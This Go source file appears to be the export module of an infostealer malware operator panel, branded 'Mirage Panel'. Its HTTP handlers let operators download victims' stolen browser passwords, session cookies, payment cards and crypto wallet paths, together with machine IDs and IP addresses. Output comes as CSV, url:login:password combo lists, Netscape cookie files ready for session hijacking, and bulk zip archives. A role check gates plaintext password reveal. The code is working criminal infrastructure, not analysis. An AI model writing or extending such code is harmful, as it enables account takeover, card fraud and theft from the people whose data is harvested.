package api

import (
	"archive/zip"
	"bytes"
	"database/sql"
	"encoding/csv"
	"encoding/json"
	"net/http"
	"sort"
	"strings"

	"github.com/go-chi/chi/v5"
	"zialfi-panel/internal/db"
)

type ExportHandler struct {
	db       *sql.DB
	provider db.ProviderType
}

func NewExportHandler(db *sql.DB, provider db.ProviderType) *ExportHandler {
	return &ExportHandler{db: db, provider: provider}
}

func (h *ExportHandler) ExportSession(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")

	format := r.URL.Query().Get("format")
	if format == "netscape" {
		h.exportNetscape(w, r)
		return
	}

	claims, ok := getClaims(r)
	if !ok {
		writeError(w, http.StatusUnauthorized, "authentication required")
		return
	}

	// Check session lock - hide sensitive data if locked by another
	var lockedBy string
	locked := db.QueryRow(h.db, h.provider, "SELECT locked_by FROM session_locks WHERE session_id = ?", id).Scan(&lockedBy) == nil
	if locked && lockedBy != claims.UserID && claims.Role != "admin" {
		writeError(w, http.StatusForbidden, "session is locked by another user")
		return
	}

	reveal := r.URL.Query().Get("reveal_passwords") == "true"
	if reveal {
		if claims.Role != "admin" && claims.Role != "checker" {
			reveal = false
		}
	}

	var s struct {
		ID          string
		BuildID     string
		Hwid        string
		Os          string
		Username    string
		Ip          string
		CountryCode string
		CreatedAt   string
	}
	err := db.QueryRow(h.db, h.provider, `
		SELECT id, build_id, hwid, os, username, ip, country_code, created_at
		FROM sessions WHERE id = ?`, id).Scan(
		&s.ID, &s.BuildID, &s.Hwid, &s.Os, &s.Username,
		&s.Ip, &s.CountryCode, &s.CreatedAt,
	)
	if err == sql.ErrNoRows {
		writeError(w, http.StatusNotFound, "session not found")
		return
	}
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to fetch session")
		return
	}

	if !sessionOwnedBy(h.db, h.provider, r, id) {
		writeError(w, http.StatusForbidden, "access denied")
		return
	}

	passwords := queryPasswords(h.db, id)
	if !reveal {
		for i := range passwords {
			passwords[i].PasswordValue = "[MASKED]"
		}
	}

	cookies := queryCookies(h.db, id)
	cards := queryCards(h.db, id)
	wallets := queryWalletsWithIcons(h.db, id)

	if format == "csv" {
		h.exportCSV(w, id, passwords, cookies, cards, wallets)
		return
	}
	if format == "ulp" {
		h.exportULP(w, id, passwords)
		return
	}

	resp := SessionDetailResponse{
		ID:          s.ID,
		BuildID:     s.BuildID,
		Hwid:        s.Hwid,
		Os:          s.Os,
		Username:    s.Username,
		Ip:          s.Ip,
		CountryCode: s.CountryCode,
		CreatedAt:   s.CreatedAt,
		Passwords:   passwords,
		Cookies:     cookies,
		Cards:       cards,
		Wallets:     wallets,
		Files:       queryFiles(h.db, id),
		SystemInfo:  querySystemInfo(h.db, id),
	}

	writeJSON(w, http.StatusOK, resp)
}

func (h *ExportHandler) exportCSV(w http.ResponseWriter, sessionID string, passwords []db.Password, cookies []db.Cookie, cards []db.Card, wallets []db.WalletResponse) {
	w.Header().Set("Content-Type", "text/csv")
	w.Header().Set("Content-Disposition", "attachment; filename=session_"+sessionID+".csv")

	cw := csv.NewWriter(w)
	cw.Write([]string{"type", "url", "username", "password", "domain", "cookie_name", "cookie_value", "card_number", "card_expiry", "card_holder", "wallet_name", "wallet_path"})

	for _, p := range passwords {
		cw.Write([]string{"password", p.Url, p.Username, p.PasswordValue, "", "", "", "", "", "", "", ""})
	}
	for _, c := range cookies {
		cw.Write([]string{"cookie", "", "", "", c.Domain, c.Name, c.Value, "", "", "", "", ""})
	}
	for _, c := range cards {
		expiry := ""
		if c.ExpMonth != "" || c.ExpYear != "" {
			expiry = c.ExpMonth + "/" + c.ExpYear
		}
		cw.Write([]string{"card", "", "", "", "", "", "", c.Number, expiry, c.Holder, "", ""})
	}
	for _, w2 := range wallets {
		cw.Write([]string{"wallet", "", "", "", "", "", "", "", "", "", w2.Name, w2.Path})
	}

	cw.Flush()
}

func (h *ExportHandler) exportULP(w http.ResponseWriter, sessionID string, passwords []db.Password) {
	w.Header().Set("Content-Type", "text/plain")
	w.Header().Set("Content-Disposition", "attachment; filename=session_"+sessionID+".ulp.txt")

	var b strings.Builder
	for _, p := range passwords {
		b.WriteString(p.Url)
		b.WriteByte(':')
		b.WriteString(p.Username)
		b.WriteByte(':')
		b.WriteString(p.PasswordValue)
		b.WriteByte('\n')
	}
	w.Write([]byte(b.String()))
}

func (h *ExportHandler) exportNetscape(w http.ResponseWriter, r *http.Request) {
	sessionID := chi.URLParam(r, "id")

	claims, ok := getClaims(r)
	if !ok {
		writeError(w, http.StatusUnauthorized, "authentication required")
		return
	}

	var lockedBy string
	locked := db.QueryRow(h.db, h.provider, "SELECT locked_by FROM session_locks WHERE session_id = ?", sessionID).Scan(&lockedBy) == nil
	if locked && lockedBy != claims.UserID && claims.Role != "admin" {
		writeError(w, http.StatusForbidden, "session is locked by another user")
		return
	}

	var exists bool
	err := db.QueryRow(h.db, h.provider, "SELECT EXISTS(SELECT 1 FROM sessions WHERE id = ?)", sessionID).Scan(&exists)
	if err != nil || !exists {
		writeError(w, http.StatusNotFound, "session not found")
		return
	}

	if !sessionOwnedBy(h.db, h.provider, r, sessionID) {
		writeError(w, http.StatusForbidden, "access denied")
		return
	}

	cookies := queryCookies(h.db, sessionID)

	w.Header().Set("Content-Type", "text/plain")
	w.Header().Set("Content-Disposition", "attachment; filename=cookies_"+sessionID+".txt")
	w.WriteHeader(http.StatusOK)

	w.Write([]byte("# Netscape HTTP Cookie File\n"))
	w.Write([]byte("# https://curl.se/rfc/cookie_spec.html\n"))
	w.Write([]byte("# This file was auto-generated by Mirage Panel\n\n"))

	for _, c := range cookies {
		domain := c.Domain
		if domain != "" && domain[0] != '.' {
			domain = "." + domain
		}
		if domain == "" {
			continue
		}

		path := c.Path
		if path == "" {
			path = "/"
		}

		name := c.Name
		value := c.Value

		w.Write([]byte(domain + "\tTRUE\t" + path + "\tFALSE\t0\t" + name + "\t" + value + "\n"))
	}
}

func (h *ExportHandler) ExportBulk(w http.ResponseWriter, r *http.Request) {
	claims, ok := getClaims(r)
	if !ok {
		writeError(w, http.StatusUnauthorized, "authentication required")
		return
	}

	var req struct {
		IDs []string `json:"ids"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeError(w, http.StatusBadRequest, "invalid JSON")
		return
	}
	if len(req.IDs) == 0 {
		writeError(w, http.StatusBadRequest, "ids required")
		return
	}

	format := r.URL.Query().Get("format")
	ext := ".json"
	if format == "csv" {
		ext = ".csv"
	} else if format == "ulp" {
		ext = ".ulp.txt"
	}

	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)

	for _, id := range req.IDs {
		if !sessionOwnedBy(h.db, h.provider, r, id) {
			continue
		}

		var lockedBy string
		locked := db.QueryRow(h.db, h.provider, "SELECT locked_by FROM session_locks WHERE session_id = ?", id).Scan(&lockedBy) == nil
		if locked && lockedBy != claims.UserID && claims.Role != "admin" {
			continue
		}

		passwords := queryPasswords(h.db, id)
		cookies := queryCookies(h.db, id)
		cards := queryCards(h.db, id)
		wallets := queryWalletsWithIcons(h.db, id)

		var content []byte
		var err error

		switch format {
		case "csv":
			var csvBuf bytes.Buffer
			cw := csv.NewWriter(&csvBuf)
			cw.Write([]string{"type", "url", "username", "password", "domain", "cookie_name", "cookie_value", "card_number", "card_expiry", "card_holder", "wallet_name", "wallet_path"})
			for _, p := range passwords {
				cw.Write([]string{"password", p.Url, p.Username, p.PasswordValue, "", "", "", "", "", "", "", ""})
			}
			for _, c := range cookies {
				cw.Write([]string{"cookie", "", "", "", c.Domain, c.Name, c.Value, "", "", "", "", ""})
			}
			for _, c := range cards {
				expiry := ""
				if c.ExpMonth != "" || c.ExpYear != "" {
					expiry = c.ExpMonth + "/" + c.ExpYear
				}
				cw.Write([]string{"card", "", "", "", "", "", "", c.Number, expiry, c.Holder, "", ""})
			}
			for _, w := range wallets {
				cw.Write([]string{"wallet", "", "", "", "", "", "", "", "", "", w.Name, w.Path})
			}
			cw.Flush()
			content = csvBuf.Bytes()
		case "ulp":
			var b strings.Builder
			for _, p := range passwords {
				b.WriteString(p.Url)
				b.WriteByte(':')
				b.WriteString(p.Username)
				b.WriteByte(':')
				b.WriteString(p.PasswordValue)
				b.WriteByte('\n')
			}
			content = []byte(b.String())
		default:
			resp := SessionDetailResponse{
				Passwords:  passwords,
				Cookies:    cookies,
				Cards:      cards,
				Wallets:    wallets,
				Files:      queryFiles(h.db, id),
				SystemInfo: querySystemInfo(h.db, id),
			}

			var s struct {
				ID, BuildID, Hwid, Os, Username, Ip, CountryCode, CreatedAt string
			}
			err = db.QueryRow(h.db, h.provider, `
				SELECT id, build_id, hwid, os, username, ip, country_code, created_at
				FROM sessions WHERE id = ?`, id).Scan(
				&s.ID, &s.BuildID, &s.Hwid, &s.Os, &s.Username,
				&s.Ip, &s.CountryCode, &s.CreatedAt,
			)
			if err != nil {
				continue
			}
			resp.ID = s.ID
			resp.BuildID = s.BuildID
			resp.Hwid = s.Hwid
			resp.Os = s.Os
			resp.Username = s.Username
			resp.Ip = s.Ip
			resp.CountryCode = s.CountryCode
			resp.CreatedAt = s.CreatedAt
			content, err = json.Marshal(resp)
			if err != nil {
				continue
			}
		}

		f, err := zw.Create(id + ext)
		if err != nil {
			continue
		}
		if _, err := f.Write(content); err != nil {
			continue
		}
	}

	zw.Close()

	w.Header().Set("Content-Type", "application/zip")
	w.Header().Set("Content-Disposition", "attachment; filename=export.zip")
	w.WriteHeader(http.StatusOK)
	w.Write(buf.Bytes())
}

func (h *ExportHandler) ExportUserAgents(w http.ResponseWriter, r *http.Request) {
	rows, err := db.Query(h.db, h.provider, "SELECT user_agent FROM system_info WHERE user_agent IS NOT NULL AND user_agent != ''")
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to query user agents")
		return
	}
	defer rows.Close()

	counts := make(map[string]int)
	for rows.Next() {
		var ua string
		if rows.Scan(&ua) == nil && ua != "" {
			counts[ua]++
		}
	}

	type uaEntry struct {
		UserAgent string `json:"user_agent"`
		Count     int    `json:"count"`
	}
	var result []uaEntry
	for ua, count := range counts {
		result = append(result, uaEntry{UserAgent: ua, Count: count})
	}
	sort.Slice(result, func(i, j int) bool {
		return result[i].Count > result[j].Count
	})

	writeJSON(w, http.StatusOK, result)
}
